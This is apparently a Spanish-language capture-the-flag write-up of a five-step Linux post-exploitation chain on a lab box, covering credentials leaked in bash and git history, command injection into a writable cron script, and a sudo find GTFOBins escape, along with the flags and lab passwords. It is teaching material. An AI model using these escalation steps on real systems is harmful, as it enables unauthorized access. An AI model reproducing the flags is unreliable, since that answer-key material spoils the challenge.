# Hostbusters — Post-explotación Linux (charon)

**En palabras simples:** "Post-explotación" es lo que pasa *después* de ya haber entrado a un sistema con un usuario de bajos privilegios — el equivalente a haber entrado al edificio por la puerta de empleados, pero necesitar llegar a la oficina del jefe. Esta serie es una cadena de 5 pasos donde cada "usuario" comprometido deja, sin querer, una pista que permite saltar al siguiente usuario con más permisos — un historial de comandos mal borrado, una contraseña vieja en un repositorio de código, un permiso de administrador mal configurado — hasta llegar lo más arriba posible dentro del mismo sistema.

Categoría: Post-explotación / Linux. Caja "charon" (ops/staging interno de DEADFACE, workstream "Kingmaker"), accedida vía web-shell (ttyd), con un foothold inicial como el usuario de servicio `svc-deploy`. La caja es **desechable**: cada sesión del web-shell es una copia fresca, así que cada flag se agarra en el momento en que se encuentra — hay que rehacer todos los pasos anteriores cada vez que se recarga/reabre el web-shell.

Entorno base: contenedor Debian 13 (kernel 6.12.111+deb13), overlay2 (Docker).

Cadena de pivoteo de usuarios de la serie: `svc-deploy` (1001) → `deephax` → `gh0st404` (1003) → `sunstalker` (1004) → `lilith` → …

## Reto 1 — Foothold

- Reconocimiento: `whoami; id; hostname; pwd`, `uname -a`, `ls -la /`.
- La flag estaba directa en el home del usuario `svc-deploy` (uid 1001):
  ```
  ls -la ~
  cat flag.txt
  ```
- **Flag:** `deadface{f00th0ld_p4st_th3_v31l}`

## Reto 2 — Acceder a la cuenta de otro miembro (vía bash history)

- `cat ~/.bash_history` en `svc-deploy` reveló un comando de rotación de contraseña filtrado:
  ```
  echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
  history -c
  ```
  El operador intentó borrar el historial después, pero el comando ya había quedado escrito en el archivo antes de limpiarlo.
- Pivote: `su deephax` (password `Sk4t3rB0y_S1nce_2011`) → `cd ~ && cat flag.txt`.
- **Trampa:** `su <usuario>` sin `-`/`-l` cambia el usuario efectivo pero NO el directorio de trabajo — hay que hacer `cd ~` explícitamente después de cada `su`.
- **Flag:** `deadface{sh3ll_h1st0ry_t3lls_4ll}`

## Reto 3 — Credenciales "scrubbed" en un repo git de deephax

- En el home de `deephax`, `notes.txt` confirma que la credencial del scraper sigue en el historial de git, nunca se purgó de verdad.
- ```bash
  cd kingmaker-scraper && git log --all --oneline
  git show 95b064e
  ```
  El primer commit traía `config.py` con credenciales en texto plano:
  ```python
  SERVICE_USER = "gh0st404"
  SERVICE_PW = "Gh0stInTh3Sh3ll_404"
  ```
- Pivote: `su gh0st404` → `cd ~ && cat flag.txt`.
- **Flag:** `deadface{g1t_l0g_sp1lls_s3cr3ts}`

## Reto 4 — Abuso de cron job de otro usuario (vía script escribible)

- Cron corre cada minuto como `sunstalker`, ejecutando `/opt/scrape/collect.sh` — propiedad y escribible por `gh0st404` (el usuario en que ya estábamos).
- Inyección de comando en el script que corre el cron como `sunstalker`:
  ```bash
  echo 'cp /home/sunstalker/flag.txt /tmp/sunstalker_flag.txt; chmod 644 /tmp/sunstalker_flag.txt' >> /opt/scrape/collect.sh
  # esperar ~60s a que el cron dispare
  cat /tmp/sunstalker_flag.txt
  ```
- **Flag:** `deadface{cr0n_c4rr13d_my_p4yl04d}`
- Técnica clásica de escalada vía "cron job + script escribible por otro usuario que lo ejecuta" — no hizo falta shell interactivo.

## Reto 5 — Regla sudo NOPASSWD sobre `find` → escape GTFOBins a `lilith`

- Enumeración del permiso "estrecho" de sunstalker vía el mismo cron:
  ```bash
  echo 'sudo -n -l > /tmp/sun_sudo.txt 2>&1; chmod 644 /tmp/sun_sudo.txt' >> /opt/scrape/collect.sh
  ```
  Resultado: `(lilith) NOPASSWD: /usr/bin/find` — `find` con `-exec` da ejecución arbitraria (GTFOBins clásico).
- Explotación:
  ```bash
  echo 'sudo -n -u lilith /usr/bin/find /etc/hostname -exec cp /home/lilith/flag.txt /tmp/lilith_flag.txt \; -exec chmod 644 /tmp/lilith_flag.txt \;' >> /opt/scrape/collect.sh
  cat /tmp/lilith_flag.txt
  ```
- **Flag:** `deadface{sud0_f1nd_4_w4y_1n}`
- Tropiezo documentado: copiar `/bin/bash` setuid-root no funcionó como "shell instantánea" (bash dropea privilegios aun con `-p`); la vía directa fue usar la ejecución-como-sunstalker que ya daba el cron.

## Lecciones de la serie

- Cada vez que la sesión del web-shell se cierra/recarga, la caja vuelve a su estado inicial — hay que rehacer rápido el pivoteo ya conocido.
- `su <usuario>` sin `-l` no cambia el cwd — siempre `cd ~` después de cambiar de usuario.
- El historial de shell es una fuente de credenciales filtradas incluso cuando el operador intenta limpiarlo después.
- Un repo git "limpiado" en un commit posterior sigue teniendo los secretos en el historial completo (`git log --all` + `git show`).
- Un cron que corre como usuario A pero ejecuta un script propiedad/escribible por usuario B es escalada directa — no hace falta shell interactiva de A.
- Una regla `sudo NOPASSWD` sobre un binario con capacidad de ejecutar comandos (ver GTFOBins) NO es un permiso "estrecho": es ejecución arbitraria como el usuario objetivo.
- Cuando ya hay ejecución-como-usuario-X por un canal indirecto, se puede abusar de sus privilegios (incluido `sudo -l`) sin necesidad de una shell login de X.
- Patrón recurrente: cada miembro comprometido deja una pista o capacidad que lleva directo al siguiente — cadena de pivoteo lateral clásica de post-explotación.

---
[&larr; volver al índice](../README.md)
